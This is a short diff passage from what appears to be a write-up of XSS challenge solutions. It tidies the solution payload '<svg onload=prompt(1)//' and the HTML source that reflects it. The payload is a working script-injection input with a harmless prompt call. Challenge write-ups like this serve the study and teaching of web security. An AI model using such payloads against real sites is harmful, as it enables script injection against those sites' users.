@@ -42,13 +42,13 @@ function escape(input) {
 - Solution
 
 ```html
-<svg onload=prompt(1) // 
+<svg onload=prompt(1)//
 ```
 
 - HTML source
 
 ```html
-<article><svg onload=prompt(1) // </article>
+<article><svg onload=prompt(1)// </article>
 ```
 
 ### 2. Parenthesis-less
